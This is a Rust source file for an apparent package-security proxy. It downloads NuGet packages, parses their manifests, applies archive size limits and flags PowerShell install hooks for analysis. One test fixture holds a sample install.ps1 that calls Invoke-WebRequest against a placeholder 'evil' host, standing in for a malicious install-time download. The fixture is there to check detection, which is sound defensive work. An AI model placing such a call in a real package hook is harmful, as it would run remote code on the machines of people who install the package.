//! NuGet `Ecosystem` implementation.
//!
//! - Fetches `.nupkg` files (ZIP archives) from the flat-container
//!   API (`https://api.nuget.org/v3-flatcontainer/...`).
//! - Parses the embedded `<id>.nuspec` (XML) for the canonical
//!   manifest view.
//! - Surfaces `tools/install.ps1`, `tools/init.ps1`, and
//!   `tools/uninstall.ps1` as install-time lifecycle entries.
//!   These run under the legacy `packages.config` workflow; the
//!   newer `PackageReference` workflow does NOT execute them, but
//!   the proxy can't tell which consumer will pick up the package,
//!   so we treat them as live.

use std::collections::BTreeMap;
use std::io::Read;

use async_trait::async_trait;
use monomi_core::{
    artifact::{EcosystemId, HashAlgo, Integrity},
    ecosystem::{Ecosystem, LifecycleEntry, LifecycleKind, Tarball},
    entry::{Entry, EntryKind},
    error::{Error, Result},
    manifest::Manifest,
};
use quick_xml::events::Event;
use quick_xml::Reader;

const FLAT_BASE: &str = "https://api.nuget.org/v3-flatcontainer";

#[derive(Debug, Clone, Copy)]
pub struct Limits {
    pub max_total_uncompressed: u64,
    pub max_entries: usize,
    pub max_entry_size: u64,
}

impl Default for Limits {
    fn default() -> Self {
        Self {
            max_total_uncompressed: 200 * 1024 * 1024,
            max_entries: 50_000,
            max_entry_size: 100 * 1024 * 1024,
        }
    }
}

pub struct NugetEcosystem {
    flat_base: String,
    http: reqwest::Client,
    limits: Limits,
}

impl Default for NugetEcosystem {
    fn default() -> Self {
        Self::new()
    }
}

impl NugetEcosystem {
    pub fn new() -> Self {
        Self {
            flat_base: FLAT_BASE.to_string(),
            http: reqwest::Client::builder()
                .user_agent(concat!("monomi/", env!("CARGO_PKG_VERSION")))
                .timeout(std::time::Duration::from_secs(60))
                .build()
                .expect("reqwest client"),
            limits: Limits::default(),
        }
    }

    pub fn with_flat_base(mut self, base: impl Into<String>) -> Self {
        self.flat_base = base.into().trim_end_matches('/').to_string();
        self
    }

    pub fn with_limits(mut self, limits: Limits) -> Self {
        self.limits = limits;
        self
    }
}

#[async_trait]
impl Ecosystem for NugetEcosystem {
    fn id(&self) -> EcosystemId {
        EcosystemId::Nuget
    }

    async fn fetch(&self, name: &str, version: &str) -> Result<Tarball> {
        // NuGet flat container expects lower-cased id and version
        // in the URL path (it's the only registry where the casing
        // of the URL matters this much).
        let id_l = name.to_ascii_lowercase();
        let ver_l = version.to_ascii_lowercase();
        let url = format!(
            "{base}/{id}/{ver}/{id}.{ver}.nupkg",
            base = self.flat_base,
            id = id_l,
            ver = ver_l,
        );
        let resp = self
            .http
            .get(&url)
            .send()
            .await
            .map_err(|e| Error::Fetch(format!("{url}: {e}")))?;
        let status = resp.status();
        if status == reqwest::StatusCode::NOT_FOUND {
            return Err(Error::NotFound(format!("{name}@{version}")));
        }
        if !status.is_success() {
            return Err(Error::Fetch(format!("{url}: HTTP {status}")));
        }
        let bytes = resp
            .bytes()
            .await
            .map_err(|e| Error::Fetch(format!("{url}: {e}")))?
            .to_vec();
        Ok(Tarball {
            source_url: Some(url),
            bytes,
        })
    }

    async fn latest_version(&self, name: &str) -> Result<Option<String>> {
        // Flat-container index lists all versions for the package
        // in publish order. NuGet doesn't expose an explicit "stable
        // latest" pointer here, but the last non-prerelease entry is
        // the conventional choice. We pick the last entry that does
        // not contain `-` (the SemVer prerelease marker); fall back
        // to the last entry overall.
        let id_l = name.to_ascii_lowercase();
        let url = format!("{base}/{id}/index.json", base = self.flat_base, id = id_l);
        let resp = self
            .http
            .get(&url)
            .send()
            .await
            .map_err(|e| Error::Fetch(format!("{url}: {e}")))?;
        let status = resp.status();
        if status == reqwest::StatusCode::NOT_FOUND {
            return Ok(None);
        }
        if !status.is_success() {
            return Err(Error::Fetch(format!("{url}: HTTP {status}")));
        }
        let json: serde_json::Value = resp
            .json()
            .await
            .map_err(|e| Error::Fetch(format!("{url}: {e}")))?;
        let versions = json
            .get("versions")
            .and_then(|v| v.as_array())
            .ok_or_else(|| Error::Fetch(format!("{url}: missing versions[]")))?;
        let strs: Vec<&str> = versions.iter().filter_map(|v| v.as_str()).collect();
        let stable = strs.iter().rev().find(|v| !v.contains('-'));
        Ok(stable
            .copied()
            .map(ToString::to_string)
            .or_else(|| strs.last().copied().map(ToString::to_string)))
    }

    fn integrity(&self, tar: &Tarball) -> Integrity {
        // NuGet PackageHash is SHA-512 base64 of the .nupkg.
        Integrity::from_bytes(HashAlgo::Sha512, &tar.bytes)
    }

    fn parse_manifest(&self, tar: &Tarball) -> Result<Manifest> {
        let entries = walk_nupkg(tar, &self.limits)?;
        let nuspec = entries
            .iter()
            .find(|e| e.path.ends_with(".nuspec") && !e.path.contains('/'))
            .ok_or_else(|| Error::Manifest("no .nuspec at archive root".into()))?;
        let nuspec_str = std::str::from_utf8(&nuspec.bytes)
            .map_err(|e| Error::Manifest(format!(".nuspec: {e}")))?;
        let parsed =
            parse_nuspec(nuspec_str).map_err(|e| Error::Manifest(format!(".nuspec: {e}")))?;

        Ok(Manifest {
            name: parsed.id,
            version: parsed.version,
            repository: parsed.repository,
            homepage: parsed.project_url,
            bin: BTreeMap::new(),
            scripts: BTreeMap::new(),
            dependencies: parsed.dependencies,
            raw: serde_json::Value::Null,
        })
    }

    fn lifecycle_entrypoints(
        &self,
        tar: &Tarball,
        _manifest: &Manifest,
    ) -> Result<Vec<LifecycleEntry>> {
        const HOOKS: &[&str] = &["tools/install.ps1", "tools/init.ps1", "tools/uninstall.ps1"];
        let entries = walk_nupkg(tar, &self.limits)?;
        let mut out = Vec::new();
        for hook in HOOKS {
            if let Some(e) = entries.iter().find(|e| e.path.eq_ignore_ascii_case(hook)) {
                let body = String::from_utf8_lossy(&e.bytes).into_owned();
                let name = hook.trim_start_matches("tools/").trim_end_matches(".ps1");
                out.push(LifecycleEntry {
                    name: name.to_string(),
                    kind: LifecycleKind::InstallTime,
                    body,
                    path: Some(hook.to_string()),
                });
            }
        }
        Ok(out)
    }

    fn walk(&self, tar: &Tarball) -> Result<Vec<Entry>> {
        walk_nupkg(tar, &self.limits)
    }
}

fn walk_nupkg(tar: &Tarball, limits: &Limits) -> Result<Vec<Entry>> {
    let reader = std::io::Cursor::new(&tar.bytes);
    let mut zip =
        zip::ZipArchive::new(reader).map_err(|e| Error::InvalidTarball(format!("zip: {e}")))?;
    let mut out = Vec::new();
    let mut total: u64 = 0;

    for i in 0..zip.len() {
        let mut entry = zip
            .by_index(i)
            .map_err(|e| Error::InvalidTarball(format!("zip entry: {e}")))?;
        if !entry.is_file() {
            continue;
        }
        let path = entry
            .enclosed_name()
            .ok_or_else(|| Error::InvalidTarball(format!("unsafe path: {}", entry.name())))?
            .to_string_lossy()
            .replace('\\', "/");
        // Skip OPC/.signature metadata that ships in every signed
        // .nupkg — it inflates the entry count without giving the
        // analyzer anything useful.
        if path.starts_with("_rels/")
            || path.starts_with("package/services/")
            || path == "[Content_Types].xml"
            || path.starts_with(".signature.")
        {
            continue;
        }

        let size = entry.size();
        if size > limits.max_entry_size {
            return Err(Error::Oversized {
                what: "entry",
                size,
                limit: limits.max_entry_size,
            });
        }
        total = total.saturating_add(size);
        if total > limits.max_total_uncompressed {
            return Err(Error::Oversized {
                what: "total",
                size: total,
                limit: limits.max_total_uncompressed,
            });
        }
        if out.len() >= limits.max_entries {
            return Err(Error::Oversized {
                what: "entries",
                size: out.len() as u64 + 1,
                limit: limits.max_entries as u64,
            });
        }

        let mut bytes = Vec::with_capacity(size as usize);
        entry
            .read_to_end(&mut bytes)
            .map_err(|e| Error::InvalidTarball(format!("read {path}: {e}")))?;
        let kind = classify(&path, &bytes);
        out.push(Entry {
            path,
            kind,
            size,
            bytes,
            mode: None,
        });
    }
    Ok(out)
}

fn classify(path: &str, bytes: &[u8]) -> EntryKind {
    let lower = path.to_ascii_lowercase();
    if lower.ends_with(".json") {
        return EntryKind::Json;
    }
    if lower.ends_with(".dll") || lower.ends_with(".exe") || is_native_binary(bytes) {
        return EntryKind::NativeBinary;
    }
    if std::str::from_utf8(bytes).is_ok() {
        EntryKind::Text
    } else {
        EntryKind::Binary
    }
}

fn is_native_binary(bytes: &[u8]) -> bool {
    matches!(
        bytes.get(0..4),
        Some(b"\x7fELF")
            | Some([0xCF, 0xFA, 0xED, 0xFE])
            | Some([0xCE, 0xFA, 0xED, 0xFE])
            | Some([0xCA, 0xFE, 0xBA, 0xBE])
            | Some([b'M', b'Z', _, _])
    )
}

#[derive(Debug, Default)]
struct NuspecFields {
    id: String,
    version: String,
    project_url: Option<String>,
    repository: Option<String>,
    dependencies: BTreeMap<String, String>,
}

fn parse_nuspec(xml: &str) -> std::result::Result<NuspecFields, String> {
    let mut reader = Reader::from_str(xml);
    reader.config_mut().trim_text(true);
    let mut buf = Vec::new();
    let mut fields = NuspecFields::default();
    let mut path: Vec<String> = Vec::new();
    let mut last_text: Option<String> = None;

    loop {
        match reader.read_event_into(&mut buf) {
            Err(e) => return Err(e.to_string()),
            Ok(Event::Eof) => break,
            Ok(Event::Start(e)) => {
                let name = String::from_utf8_lossy(e.name().as_ref()).to_string();
                // <dependency id="X" version="Y" />
                if name == "dependency" {
                    let mut id = None;
                    let mut ver = None;
                    for a in e.attributes().flatten() {
                        let key = String::from_utf8_lossy(a.key.as_ref()).to_string();
                        let val = a
                            .unescape_value()
                            .map(|c| c.into_owned())
                            .unwrap_or_default();
                        if key == "id" {
                            id = Some(val);
                        } else if key == "version" {
                            ver = Some(val);
                        }
                    }
                    if let (Some(id), Some(ver)) = (id, ver) {
                        fields.dependencies.insert(id, ver);
                    }
                }
                // <repository url="..." />
                if name == "repository" && fields.repository.is_none() {
                    for a in e.attributes().flatten() {
                        let key = String::from_utf8_lossy(a.key.as_ref()).to_string();
                        if key == "url" {
                            fields.repository = Some(
                                a.unescape_value()
                                    .map(|c| c.into_owned())
                                    .unwrap_or_default(),
                            );
                        }
                    }
                }
                path.push(name);
                last_text = None;
            }
            Ok(Event::Empty(e)) => {
                // Self-closing — same attribute handling as Start.
                let name = String::from_utf8_lossy(e.name().as_ref()).to_string();
                if name == "dependency" {
                    let mut id = None;
                    let mut ver = None;
                    for a in e.attributes().flatten() {
                        let key = String::from_utf8_lossy(a.key.as_ref()).to_string();
                        let val = a
                            .unescape_value()
                            .map(|c| c.into_owned())
                            .unwrap_or_default();
                        if key == "id" {
                            id = Some(val);
                        } else if key == "version" {
                            ver = Some(val);
                        }
                    }
                    if let (Some(id), Some(ver)) = (id, ver) {
                        fields.dependencies.insert(id, ver);
                    }
                }
                if name == "repository" && fields.repository.is_none() {
                    for a in e.attributes().flatten() {
                        let key = String::from_utf8_lossy(a.key.as_ref()).to_string();
                        if key == "url" {
                            fields.repository = Some(
                                a.unescape_value()
                                    .map(|c| c.into_owned())
                                    .unwrap_or_default(),
                            );
                        }
                    }
                }
            }
            Ok(Event::Text(t)) => {
                last_text = Some(t.unescape().map(|c| c.into_owned()).unwrap_or_default());
            }
            Ok(Event::End(_)) => {
                let leaf = path.last().cloned().unwrap_or_default();
                let parent = if path.len() >= 2 {
                    path[path.len() - 2].clone()
                } else {
                    String::new()
                };
                if parent == "metadata" {
                    let text = last_text.take().unwrap_or_default();
                    match leaf.as_str() {
                        "id" if fields.id.is_empty() => fields.id = text,
                        "version" if fields.version.is_empty() => fields.version = text,
                        "projectUrl" if fields.project_url.is_none() => {
                            fields.project_url = Some(text)
                        }
                        _ => {}
                    }
                }
                path.pop();
            }
            _ => {}
        }
        buf.clear();
    }
    if fields.id.is_empty() {
        return Err("<id> not found".into());
    }
    Ok(fields)
}

pub fn load_nupkg_from_path(path: &std::path::Path) -> Result<Tarball> {
    let bytes = std::fs::read(path)?;
    Ok(Tarball {
        source_url: None,
        bytes,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use zip::write::SimpleFileOptions;
    use zip::ZipWriter;

    fn build_nupkg(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut buf = Vec::new();
        {
            let cursor = std::io::Cursor::new(&mut buf);
            let mut zw = ZipWriter::new(cursor);
            let opts: SimpleFileOptions =
                SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
            for (p, data) in files {
                zw.start_file(*p, opts).unwrap();
                zw.write_all(data).unwrap();
            }
            zw.finish().unwrap();
        }
        buf
    }

    const NUSPEC: &str = r#"<?xml version="1.0"?>
<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">
  <metadata>
    <id>Demo.Pkg</id>
    <version>1.2.3</version>
    <projectUrl>https://example.com/demo</projectUrl>
    <repository url="https://example.com/demo.git"/>
    <dependencies>
      <dependency id="Newtonsoft.Json" version="13.0.3"/>
    </dependencies>
  </metadata>
</package>"#;

    #[test]
    fn parses_nuspec_and_walks() {
        let bytes = build_nupkg(&[
            ("Demo.Pkg.nuspec", NUSPEC.as_bytes()),
            ("lib/net8.0/Demo.Pkg.dll", b"MZ\x90\x00fake-pe"),
            ("[Content_Types].xml", b"<types/>"),
            ("_rels/.rels", b"<rels/>"),
        ]);
        let tar = monomi_core::Tarball {
            source_url: None,
            bytes,
        };
        let eco = NugetEcosystem::new();
        let m = eco.parse_manifest(&tar).unwrap();
        assert_eq!(m.name, "Demo.Pkg");
        assert_eq!(m.version, "1.2.3");
        assert_eq!(
            m.repository.as_deref(),
            Some("https://example.com/demo.git")
        );
        assert_eq!(m.homepage.as_deref(), Some("https://example.com/demo"));
        assert_eq!(
            m.dependencies.get("Newtonsoft.Json").map(String::as_str),
            Some("13.0.3")
        );
        let walked = eco.walk(&tar).unwrap();
        // OPC noise (`_rels/`, `[Content_Types].xml`) is filtered out.
        assert!(walked.iter().all(|e| !e.path.starts_with("_rels/")));
        assert!(walked.iter().all(|e| e.path != "[Content_Types].xml"));
        assert!(walked
            .iter()
            .any(|e| e.path == "lib/net8.0/Demo.Pkg.dll" && e.kind == EntryKind::NativeBinary));
    }

    #[test]
    fn surfaces_install_ps1_as_lifecycle() {
        let ps1 = b"Write-Host 'installing'\nInvoke-WebRequest http://evil/\n";
        let bytes = build_nupkg(&[
            ("Demo.Pkg.nuspec", NUSPEC.as_bytes()),
            ("tools/install.ps1", ps1.as_slice()),
        ]);
        let tar = monomi_core::Tarball {
            source_url: None,
            bytes,
        };
        let eco = NugetEcosystem::new();
        let m = eco.parse_manifest(&tar).unwrap();
        let life = eco.lifecycle_entrypoints(&tar, &m).unwrap();
        assert_eq!(life.len(), 1);
        assert_eq!(life[0].name, "install");
        assert!(life[0].body.contains("Invoke-WebRequest"));
    }

    #[test]
    fn integrity_is_sha512() {
        let tar = monomi_core::Tarball {
            source_url: None,
            bytes: b"hi".to_vec(),
        };
        let i = NugetEcosystem::new().integrity(&tar);
        assert_eq!(i.algo, HashAlgo::Sha512);
        assert!(i.sri().starts_with("sha512-"));
    }

    #[test]
    fn parse_nuspec_with_namespace() {
        let f = parse_nuspec(NUSPEC).unwrap();
        assert_eq!(f.id, "Demo.Pkg");
        assert_eq!(f.version, "1.2.3");
        assert_eq!(
            f.repository.as_deref(),
            Some("https://example.com/demo.git")
        );
    }
}
